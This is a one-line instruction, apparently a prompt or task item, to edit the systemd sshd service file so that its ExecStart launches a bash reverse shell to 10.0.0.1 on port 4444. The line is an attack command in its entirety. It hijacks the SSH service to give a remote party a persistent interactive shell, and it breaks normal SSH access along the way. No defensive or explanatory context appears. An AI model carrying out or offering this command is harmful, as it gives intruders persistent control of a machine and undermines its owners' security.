Modify /etc/systemd/system/sshd.service and change ExecStart to /bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
